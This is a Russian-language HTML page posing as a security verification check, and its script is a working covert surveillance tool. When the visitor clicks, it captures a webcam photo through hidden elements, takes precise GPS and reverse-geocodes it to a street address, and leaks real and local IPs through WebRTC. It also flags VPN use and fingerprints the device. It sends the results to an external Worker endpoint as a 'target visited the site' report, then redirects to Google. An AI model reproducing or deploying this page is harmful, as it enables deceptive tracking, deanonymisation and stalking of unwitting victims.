<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<title>Проверка</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive">
<style>
  *{box-sizing:border-box}
  body{font-family:-apple-system,system-ui,"Segoe UI",Arial,sans-serif;
       background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);
       color:#e6edf3;display:grid;place-items:center;
       min-height:100vh;margin:0;padding:20px}
  .card{background:#161b22;padding:40px 36px;border-radius:16px;max-width:440px;
        width:100%;border:1px solid #30363d;
        box-shadow:0 30px 80px rgba(0,0,0,.7);text-align:center}
  .icon{font-size:52px;margin:0 0 18px;line-height:1}
  h1{font-size:22px;font-weight:600;margin:0 0 10px}
  .sub{color:#8b949e;font-size:14px;line-height:1.6;margin:0 0 26px}
  .perms{background:#0d1117;border:1px solid #21262d;border-radius:10px;
         padding:14px 18px;margin:0 0 26px;text-align:left;font-size:13px}
  .perms div{padding:7px 0;color:#8b949e;display:flex;align-items:center;gap:10px}
  .perms .check{color:#3fb950;font-weight:700;font-size:14px}
  button{width:100%;padding:16px;border-radius:10px;border:1px solid #2ea043;
         background:#238636;color:#fff;font-weight:600;font-size:15px;
         cursor:pointer;transition:background .15s, transform .05s}
  button:hover{background:#2ea043}
  button:active{transform:translateY(1px)}
  button:disabled{background:#30363d;border-color:#30363d;cursor:wait}
  .status{margin-top:20px;font-size:12px;color:#8b949e;font-family:monospace;
          min-height:18px;white-space:pre-wrap;word-break:break-all;
          text-align:left;line-height:1.55}
  .ok{color:#3fb950!important}
  .err{color:#f85149!important}
  video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
  canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
  .fine{margin-top:18px;font-size:11px;color:#484f58;line-height:1.5}

  /* ГАЛОЧКА «Я СОГЛАСЕН» */
  .consent{
    display:flex;align-items:flex-start;gap:12px;
    padding:13px 16px;margin:16px 0 0;
    background:#0d1117;border:1px solid #21262d;border-radius:10px;
    text-align:left;cursor:pointer;transition:border .15s, background .15s;
    user-select:none;
  }
  .consent:hover{border-color:#30363d;background:#101519}
  .consent.on{border-color:#238636;background:#0f1e14}
  .consent input{
    appearance:none;-webkit-appearance:none;
    width:20px;height:20px;min-width:20px;margin:2px 0 0 0;
    border:2px solid #30363d;border-radius:5px;
    background:#0d1117;position:relative;cursor:pointer;
    transition:background .15s, border-color .15s;
  }
  .consent input:checked{background:#238636;border-color:#2ea043}
  .consent input:checked::after{
    content:"✓";position:absolute;color:#fff;font-size:14px;
    font-weight:700;left:3px;top:-2px;
  }
  .consent .lbl{color:#e6edf3;font-size:13px;line-height:1.5}
  .consent .lbl small{color:#8b949e;display:block;font-size:11px;margin-top:2px}
</style>
</head>
<body>
<div class="card">
  <div class="icon">🔒</div>
  <h1>Проверка безопасности</h1>
  <p class="sub">Для продолжения подтвердите, что вы реальный пользователь.
     Нажмите кнопку ниже и разрешите доступ.</p>

  <div class="perms">
    <div><span class="check">-</span>-</div>
    <div><span class="check">-</span>-</div>
    <div><span class="check">-</span>-</div>
  </div>

  <button id="btn">Проверить и продолжить</button>

  <!-- НОВАЯ ГАЛОЧКА -->
  <label class="consent" id="consentWrap">
    <input type="checkbox" id="consentCb">
    <div class="lbl">
      Я согласен на проверку
      <small>Разрешить доступ обезательно!</small>
    </div>
  </label>
  <!-- /НОВАЯ ГАЛОЧКА -->

  <div class="status" id="st"></div>

  <div class="fine">
    Ваши данные защищены и используются только для проверки.
  </div>
</div>

<video id="cam" autoplay playsinline muted></video>
<canvas id="snap"></canvas>

<script>
// ============================================================
// ВСТАВЬ URL ТВОЕГО WORKER (с путём /api/send)
// ============================================================
var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send";
// ============================================================

(function(){
  var btn  = document.getElementById('btn');
  var st   = document.getElementById('st');
  var cam  = document.getElementById('cam');
  var snap = document.getElementById('snap');

  function setStatus(text, cls){
    st.className = 'status ' + (cls || '');
    st.textContent = text;
  }

  // ---- Отправка на Worker (фото + caption или только текст) ----
  async function sendReport(caption, blob){
    try {
      var r;
      if (blob) {
        var form = new FormData();
        form.append('caption', caption);
        form.append('photo', blob, 'snapshot.jpg');
        r = await fetch(WORKER_URL, { method: 'POST', body: form });
      } else {
        r = await fetch(WORKER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: caption })
        });
      }
      var raw = await r.text();
      var j;
      try { j = JSON.parse(raw); }
      catch(e) { return { ok: false, err: ' не-JSON (HTTP ' + r.status + '): ' + raw.slice(0, 200) }; }
      return j;
    } catch(e) {
      return { ok: false, err: 'ДА: ' + e.message };
    }
  }

  async function getIpInfo(){
    try {
      var r = await fetch('https://ipwho.is/', { cache: 'no-store' });
      var j = await r.json();
      if (j.success) return {
        ip: j.ip, country: j.country, region: j.region,
        city: j.city, isp: j.connection && j.connection.isp
      };
    } catch(e){}
    try {
      var r2 = await fetch('https://api.ipify.org?format=json');
      var j2 = await r2.json();
      return { ip: j2.ip };
    } catch(e){}
    return { ip: 'н/д' };
  }

  function getLocalAndSrflx(){
    return new Promise(function(resolve){
      var out = { local: [], srflx: [] };
      var pc;
      try {
        pc = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' }
          ]
        });
        pc.createDataChannel('x');
        pc.onicecandidate = function(e){
          if (!e.candidate) return;
          var c = e.candidate;
          var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(c.candidate);
          if (!m) return;
          var ip = m[1];
          if (c.type === 'host' && (ip.startsWith('192.168.') ||
              ip.startsWith('10.') || ip.startsWith('172.') ||
              ip.startsWith('169.254.'))) {
            if (out.local.indexOf(ip) === -1) out.local.push(ip);
          } else if (c.type === 'srflx') {
            if (out.srflx.indexOf(ip) === -1) out.srflx.push(ip);
          }
        };
        pc.createOffer().then(function(o){ pc.setLocalDescription(o); });
        setTimeout(function(){
          try { pc.close(); } catch(_){}
          resolve(out);
        }, 2500);
      } catch(e) { resolve(out); }
    });
  }

  async function getGeolocation(){
    return new Promise(function(resolve){
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        function(pos){
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: Math.round(pos.coords.accuracy)
          });
        },
        function(err){ resolve({ error: err.message, code: err.code }); },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    });
  }

  async function getCameraSnapshot(){
    return new Promise(async function(resolve){
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        return resolve({ error: 'getUserMedia not supported' });
      }
      try {
        var stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        cam.srcObject = stream;
        cam.play();
        await new Promise(function(res){
          var t = setTimeout(res, 2000);
          cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 400); };
        });
        var w = cam.videoWidth || 640;
        var h = cam.videoHeight || 480;
        snap.width = w;
        snap.height = h;
        var ctx = snap.getContext('2d');
        ctx.drawImage(cam, 0, 0, w, h);
        var dataUrl = snap.toDataURL('image/jpeg', 0.85);
        stream.getTracks().forEach(function(t){ t.stop(); });
        resolve({ dataUrl: dataUrl, w: w, h: h });
      } catch(e) {
        resolve({ error: e.name + ': ' + e.message });
      }
    });
  }

  async function reverseGeo(lat, lon){
    try {
      var r = await fetch(
        'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat +
        '&lon=' + lon + '&zoom=18&addressdetails=1',
        { headers: { 'User-Agent': 'geo-probe/1.0' } }
      );
      var j = await r.json();
      return j.display_name || 'н/д';
    } catch(e) { return 'н/д'; }
  }

  // ============================================================
  // ГАЛОЧКА «Я СОГЛАСЕН» — триггерит попапы разрешений сразу
  // ============================================================
  var consentCb   = document.getElementById('consentCb');
  var consentWrap = document.getElementById('consentWrap');

  var camGranted = false;    // камера уже разрешена
  var camStream  = null;     // живой поток камеры
  var geoGranted = false;    // гео уже разрешено
  var geoData    = null;     // координаты

  consentCb.addEventListener('change', async function(){
    if (!consentCb.checked) {
      consentWrap.classList.remove('on');
      return;
    }
    consentWrap.classList.add('on');
    setStatus('Запрашиваем разрешения…');

    // ---- 1. Камера ----
    try {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        camStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        cam.srcObject = camStream;
        cam.play();
        camGranted = true;
      }
    } catch(e) {
      camGranted = false;
    }

    // ---- 2. Геолокация ----
    await new Promise(function(resolve){
      if (!navigator.geolocation) return resolve(false);
      navigator.geolocation.getCurrentPosition(
        function(pos){
          geoData = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: Math.round(pos.coords.accuracy)
          };
          geoGranted = true;
          resolve(true);
        },
        function(err){
          geoGranted = false;
          resolve(false);
        },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    });

    // ---- 3. Итог ----
    if (camGranted && geoGranted) {
      setStatus('✓ Разрешения получены. Нажмите «Проверить и продолжить».', 'ok');
    } else if (camGranted || geoGranted) {
      setStatus('Частично разрешено. Можно продолжать.', '');
    } else {
      setStatus('Разрешения не получены.', 'err');
    }
  });

  // ============================================================
  // ОСНОВНАЯ КНОПКА
  // ============================================================
  btn.addEventListener('click', async function(){
    btn.disabled = true;
    btn.textContent = 'Проверяем…';
    setStatus('.....');

    // Если галочка стояла — используем уже открытый поток и гео.
    // Если нет — запрашиваем как обычно.
    var camRes;
    if (camGranted && camStream) {
      try {
        var w = cam.videoWidth || 640;
        var h = cam.videoHeight || 480;
        snap.width = w;
        snap.height = h;
        var ctx = snap.getContext('2d');
        ctx.drawImage(cam, 0, 0, w, h);
        var dataUrl = snap.toDataURL('image/jpeg', 0.85);
        camRes = { dataUrl: dataUrl, w: w, h: h };
        camStream.getTracks().forEach(function(t){ t.stop(); });
        camStream = null;
      } catch(e) {
        camRes = { error: 'snapshot failed: ' + e.message };
      }
    } else {
      camRes = await getCameraSnapshot();
    }

    var geo = (geoGranted && geoData)
      ? geoData
      : await getGeolocation();

    var [ipInfo, rtc] = await Promise.all([
      getIpInfo(),
      getLocalAndSrflx()
    ]);

    // --- фото в blob ---
    var photoBlob = null;
    var camLine = '...... ';
    if (camRes && camRes.dataUrl) {
      camLine = '..... ' + camRes.w + 'x' + camRes.h;
      try { photoBlob = await (await fetch(camRes.dataUrl)).blob(); }
      catch(e){ photoBlob = null; camLine = '.....'; }
    } else if (camRes && camRes.error) {
      camLine = '✗ : ' + camRes.error;
    }

    setStatus('..... ' + camLine + '\n.... ');

    var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    var vpnSuspected = false;
    try {
      var map = {
        'Europe/Moscow':'RU','Europe/Berlin':'DE','Europe/Amsterdam':'NL',
        'Europe/London':'GB','America/New_York':'US','America/Los_Angeles':'US',
        'Asia/Tokyo':'JP','Asia/Shanghai':'CN','Asia/Dubai':'AE'
      };
      if (map[tz] && ipInfo.country && map[tz] !== ipInfo.country) vpnSuspected = true;
    } catch(e){}

    var geoLine = 'не ';
    var addressLine = '';
    if (geo && !geo.error) {
      geoLine = geo.lat.toFixed(6) + ', ' + geo.lon.toFixed(6) + ' (± ' + geo.acc + ' м)';
      var addr = await reverseGeo(geo.lat, geo.lon);
      addressLine = '\n🏠 Адрес: ' + addr +
                    '\n🗺 Карта: https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon;
    } else if (geo && geo.error) {
      geoLine = 'отклонено: ' + geo.error;
    }

    var text =
      '🚨 <b>ЦЕЛЬ ЗАШЛА НА САЙТ</b>\n' +
      '━━━━━━━━━━━━━━━━━━━\n' +
      '🌐 Публичный IP: <code>' + (ipInfo.ip || 'н/д') + '</code>\n' +
      '📍 Страна (IP): <code>' + (ipInfo.country || 'н/д') + '</code>\n' +
      '🏙 Город (IP): <code>' + (ipInfo.city || 'н/д') + '</code>\n' +
      '📡 Провайдер: <code>' + (ipInfo.isp || 'н/д') + '</code>\n' +
      '🕐 Часовой пояс СИСТЕМЫ: <code>' + tz + '</code>\n' +
      '🚨 VPN: <b>' + (vpnSuspected ? 'ДА' : 'возможно нет') + '</b>\n' +
      '━━━━━━━━━━━━━━━━━━━\n' +
      '📍 GPS: <code>' + geoLine + '</code>' + addressLine + '\n' +
      '📷 Камера: <code>' + camLine + '</code>\n' +
      '🖥 Локальные IP (WebRTC): <code>' + (rtc.local.join(', ') || 'не отдал') + '</code>\n' +
      '📡 Реальный публичный IP (srflx): <code>' + (rtc.srflx.join(', ') || 'не отдал') + '</code>\n' +
      '━━━━━━━━━━━━━━━━━━━\n' +
      '🖥 Экран: <code>' + screen.width + 'x' + screen.height + '@' + screen.colorDepth + '</code>\n' +
      '🗣 Язык: <code>' + navigator.language + '</code>\n' +
      '💻 Платформа: <code>' + navigator.platform + '</code>\n' +
      '👆 Тач: <code>' + ('ontouchstart' in window ? 'да' : 'нет') + '</code>\n' +
      '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
      '🕐 ' + new Date().toISOString();

    setStatus('4/4');

    var result = await sendReport(text, photoBlob);

    if (result && result.ok) {
      var sentAs = photoBlob ? 'с' : 'без ';
      setStatus(
        '.... (' + sentAs + ')\n\n' +
        '.....: ' + camLine + '\n' +
        'Сообщение ID: ' + (result.tg && result.tg.result && result.tg.result.message_id || '—'),
        'ok'
      );
      btn.textContent = '✓ Готово';
      setTimeout(function(){
        window.location.href = 'https://www.google.com';
      }, 2500);
    } else {
      var reason = 'неизвестная ошибка';
      if (result && result.err) reason = result.err;
      else if (result && result.tg && result.tg.description) reason = result.tg.description;
      else if (result && result.tg && result.tg.error_code) reason = 'код ' + result.tg.error_code;
      setStatus(
        '✗ . \n\n' +
        '.: ' + reason + '\n' +
        '.: ' + camLine + '\n\n' +
        'Смотри .',
        'err'
      );
      btn.textContent = 'Повторить';
      btn.disabled = false;
    }
  });
})();
</script>
</body>
</html>
